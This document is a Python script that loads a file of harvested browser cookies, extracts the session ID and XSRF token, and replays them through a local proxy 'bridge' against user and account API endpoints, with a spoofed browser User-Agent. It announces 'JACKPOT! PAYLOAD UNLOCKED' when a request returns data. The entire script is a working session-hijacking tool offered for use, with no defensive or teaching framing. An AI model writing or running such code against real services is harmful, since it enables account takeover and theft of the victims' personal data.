import json
import warnings
from curl_cffi import requests

warnings.filterwarnings("ignore")

COOKIE_FILE = "harvested_cookies.json"
BRIDGE_URL = "http://127.0.0.1:8888"

def dispatch_session():
    print("[*] Dispatching harvested session jar directly through local bridge...")
    
    try:
        with open(COOKIE_FILE, "r", encoding="utf-8") as f:
            cookies_list = json.load(f)
    except Exception as e:
        print(f"[!] Error loading {COOKIE_FILE}: {e}")
        return
        
    cookie_jar = {c['name']: c['value'] for c in cookies_list}
    xsrf_token = cookie_jar.get("XSRF-TOKEN", "")
    session_id = cookie_jar.get("sessionid", cookie_jar.get("login.sid", ""))
    
    print(f"[+] Loaded {len(cookie_jar)} cookies from jar.")
    print(f"[+] Active Session ID: {session_id[:15]}...")
    print(f"[+] Active XSRF-TOKEN: {xsrf_token[:15]}...\n")
    
    # Target endpoints through our running local bridge
    endpoints = [
        "/api/v1/users/current",
        "/api/v2/users/current",
        "/graphql",
        "/api/v1/accounts"
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    if xsrf_token:
        headers["X-XSRF-TOKEN"] = xsrf_token
        headers["X-CSRF-Token"] = xsrf_token
    if session_id:
        headers["Authorization"] = f"Bearer {session_id}"
        
    for path in endpoints:
        url = BRIDGE_URL + path
        print(f"[+] Requesting via Bridge -> {path}")
        try:
            res = requests.get(url, headers=headers, cookies=cookie_jar, timeout=10.0)
            print(f"    -> Status: {res.status_code} | Length: {len(res.text)}")
            print(f"    -> Content-Type: {res.headers.get('Content-Type', 'Unknown')}")
            if res.status_code == 200 and "html" not in res.headers.get("Content-Type", ""):
                print(f"        [***] JACKPOT! PAYLOAD UNLOCKED:\n{res.text[:800]}\n")
            else:
                print(f"        [-] Preview: {res.text[:150].strip()}\n")
        except Exception as e:
            print(f"    -> Connection Error: {e}")

    print("[*] Session dispatch cycle complete.")

if __name__ == "__main__":
    dispatch_session()
